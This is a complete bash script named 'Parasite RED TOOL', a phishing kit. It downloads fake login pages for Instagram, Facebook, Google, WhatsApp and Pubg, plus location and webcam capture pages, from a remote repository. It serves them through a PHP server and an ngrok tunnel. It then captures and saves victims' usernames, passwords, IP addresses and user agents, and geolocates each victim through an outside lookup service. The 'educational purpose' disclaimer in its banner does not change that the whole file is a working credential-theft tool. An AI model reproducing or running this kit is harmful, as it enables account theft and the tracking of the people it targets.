
trap 'printf "\n";stop;exit 1' 2


dependencies() {

command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not installed. Install it. Aborting."; exit 1; }

}

menu() {
printf "\e[01;35m[\e[0m\e[00;36m1\e[0m\e[01;35m]\e[0m\e[01;35m Instagram \e[01;35m[\e[0m\e[00;36m4\e[0m\e[01;35m]\e[0m\e[00;32m Whatsapp\e[0m\n"
printf "\e[01;35m[\e[0m\e[00;36m2\e[0m\e[01;35m]\e[0m\e[01;34m Facebook  \e[01;35m[\e[0m\e[00;36m5\e[0m\e[01;35m]\e[0m\e[00;31m Pubg\e[0m\n"
printf "\e[01;35m[\e[0m\e[00;36m3\e[0m\e[01;35m]\e[0m\e[01;33m Google    \e[01;35m[\e[0m\e[00;36m6\e[0m\e[01;35m]\e[0m\e[01;36m Location\e[0m\n"
printf "\e[01;35m[\e[0m\e[00;36m7\e[0m\e[01;35m]\e[0m\033[1;32m Say\033[1;37mCheese\e[0m\n"
read -p $'\n\e[01;35m[\e[0m\e[00;36m*\e[0m\e[01;35m] Its your choice: \e[0m\en' option


if [[ $option == 1 ]]; then
server="instagram"
start

elif [[ $option == 2 ]]; then
server="facebook"
start
elif [[ $option == 3 ]]; then
server="Google"
start
elif [[ $option == 4 ]]; then
server="Whatsapp"
start
elif [[ $option == 5 ]]; then
server="Pubg"
start
elif [[ $option == 6 ]]; then
server="Location"
start
elif [[ $option == 7 ]]; then
printf "\e[1;32m[\e[0m*\e[1;32m] starting \033[1;32m Say\033[1;37mCheese\e[0m ...\n"
saycheese


else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
menu
fi
}

saycheese() {
cd sites
cd saycheese
chmod 777 saycheese.sh
./saycheese.sh
}

stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
pkill -f -2 php > /dev/null 2>&1
fi
}

banner() {
printf "\033[1;96m       __________Parasite🧬 \033[1;91mRED \033[1;93mTOOL🛠️_________ \e[0m\n"
printf "\n"
printf "\e[1;93m      °°°°°\e[0m\033[4;36m ONLY FOR ✒️EDUCATIONAL🖌️ PURPOSE📝 \e[0m\e[1;93m°°°°°\e[0m\n"
printf "\n"
printf "\e[101m\e[1;77m:: Disclaimer: Developers assume no liability and ::\e[0m\n"
printf "\e[101m\e[1;77m:: are not responsible for any misuse or damage   ::\e[0m\n"
printf "\e[101m\e[1;77m:: caused by \033[1;93mParasite RED TOOL                    ::\e[0m\n"
printf "\n"
}

catch_cred() {
account=$(grep -o 'Account:.*' sites/$server/usernames.txt | cut -d " " -f2)
IFS=$'\n'
password=$(grep -o 'Pass:.*' sites/$server/usernames.txt | cut -d ":" -f2)
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;32m Account:\e[0m\e[1;77m %s\n\e[0m" $account
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;32m Password:\e[0m\e[1;77m %s\n\e[0m" $password
cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
printf "\e[1;32m[\e[0m\e[1;77m*\e[0m\e[1;32m] Saved:\e[0m\e[1;77m sites/%s/saved.usernames.txt\e[0m\n" $server
rm -rf sites/$server/usernames.txt

}

getcredentials() {
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting credentials 🔐. .🔍\e[0m\n"
while [ true ]; do


if [[ -e "sites/$server/usernames.txt" ]]; then
printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;32m 🔓🔑Credentials Found!\n"
catch_cred

fi
sleep 1
done 


}

catch_ip() {
touch sites/$server/saved.usernames.txt
ip=$(grep -a 'IP:' sites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
ua=$(grep 'User-Agent:' sites/$server/ip.txt | cut -d '"' -f2)
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Victim IP:\e[0m\e[1;77m %s\e[0m\n" $ip
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" $ua
printf "\e[1;32m[\e[0m\e[1;77m*\e[0m\e[1;32m] Saved:\e[0m\e[1;77m %s/saved.ip.txt\e[0m\n" $server
cat sites/$server/ip.txt >> sites/$server/saved.ip.txt


if [[ -e iptracker.log ]]; then
rm -rf iptracker.log
fi

IFS='\n'
iptracker=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$ip" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > iptracker.log)
IFS=$'\n'
continent=$(grep -o 'Continent.*' iptracker.log | head -n1 | cut -d ">" -f3 | cut -d "<" -f1)
printf "\n"
hostnameip=$(grep  -o "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f7 | cut -d ">" -f2)
if [[ $hostnameip != "" ]]; then
printf "\e[1;32m[*] Hostname:\e[0m\e[1;77m %s\e[0m\n" $hostnameip
fi
##

reverse_dns=$(grep -a "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f1)
if [[ $reverse_dns != "" ]]; then
printf "\e[1;32m[*] Reverse DNS:\e[0m\e[1;77m %s\e[0m\n" $reverse_dns
fi
##


if [[ $continent != "" ]]; then
printf "\e[1;32m[*] IP Continent:\e[0m\e[1;77m %s\e[0m\n" $continent
fi
##

country=$(grep -o 'Country:.*' iptracker.log | cut -d ">" -f3 | cut -d "&" -f1)
if [[ $country != "" ]]; then
printf "\e[1;32m[*] IP Country:\e[0m\e[1;77m %s\e[0m\n" $country
fi
##

state=$(grep -o "tracking lessimpt.*" iptracker.log | cut -d "<" -f1 | cut -d ">" -f2)
if [[ $state != "" ]]; then
printf "\e[1;32m[*] State:\e[0m\e[1;77m %s\e[0m\n" $state
fi
##
city=$(grep -o "City Location:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $city != "" ]]; then
printf "\e[1;32m[*] City Location:\e[0m\e[1;77m %s\e[0m\n" $city
fi
##

isp=$(grep -o "ISP:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $isp != "" ]]; then
printf "\e[1;32m[*] ISP:\e[0m\e[1;77m %s\e[0m\n" $isp
fi
##

as_number=$(grep -o "AS Number:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $as_number != "" ]]; then
printf "\e[1;32m[*] AS Number:\e[0m\e[1;77m %s\e[0m\n" $as_number
fi
##

ip_speed=$(grep -o "IP Address Speed:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $ip_speed != "" ]]; then
printf "\e[1;32m[*] IP Address Speed:\e[0m\e[1;77m %s\e[0m\n" $ip_speed
fi
##
ip_currency=$(grep -o "IP Currency:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $ip_currency != "" ]]; then
printf "\e[1;32m[*] IP Currency:\e[0m\e[1;77m %s\e[0m\n" $ip_currency
fi
##
printf "\n"
rm -rf iptracker.log

getcredentials
}

start() {

if [[ -e sites ]]; then
echo ""
else


printf "\e[1;92m[\e[0m*\e[1;92m] Downloading sites...\n"
arch=$(uname -a | grep -o 'arm')

if [[ $arch == *'arm'* ]]; then
wget https://github.com/Infectedterminal/sites/raw/main/sites.zip > /dev/null 2>&1
if [[ -e 'sites.zip' ]]; then
unzip 'sites.zip' > /dev/null 2>&1
chmod +x sites
rm -rf 'sites.zip'
else
printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi



else
wget https://github.com/Infectedterminal/sites/raw/main/sites.zip > /dev/null 2>&1
if [[ -e 'sites.zip' ]]; then
unzip 'sites.zip' > /dev/null 2>&1
chmod +x sites
rm -rf 'sites.zip'
else
printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi
fi
fi


if [[ -e sites/$server/ip.txt ]]; then
rm -rf sites/$server/ip.txt

fi
if [[ -e sites/$server/usernames.txt ]]; then
rm -rf sites/$server/usernames.txt

fi



if [[ -e ngrok ]]; then
echo ""
else


printf "📥\e[1;92m Downloading Ngrok...\n"
arch=$(uname -a | grep -o 'arm')

if [[ $arch == *'arm'* ]]; then
wget https://github.com/Infectedterminal/geo/raw/main/ngrok.zip > /dev/null 2>&1

if [[ -e ngrok.zip ]]; then
unzip ngrok.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok.zip

else
printf "⚠️\e[1;93m Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi
else
wget https://github.com/Infectedterminal/geo/raw/main/ngrok.zip > /dev/null 2>&1
if [[ -e ngrok.zip ]]; then
unzip ngrok.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok.zip

else
printf "⚠️\e[1;93m Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi
fi
fi

printf "\e[1;32m[\e[0m*\e[1;32m] Starting php server  ⏳\n"
cd sites/$server && php -S 127.0.0.1:1413 > /dev/null 2>&1 & 
sleep 2
printf "\e[1;32m[\e[0m*\e[1;32m] Starting ngrok server⌛\n"
./ngrok http 1413 > /dev/null 2>&1 &
sleep 10

link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngrok.io")
printf "\e[1;32m[\e[0m*\e[1;32m] Ngrok Link 👉:\e[0m\e[1;77m %s\e[0m\n" $link
checkfound
}
checkfound() {


printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting  ...\e[0m\n"
while [ true ]; do


if [[ -e "sites/$server/ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Target👤 opened the link!\n"
catch_ip
rm -rf ip.txt
fi

sleep 0.5
done 

}
banner
dependencies
menu
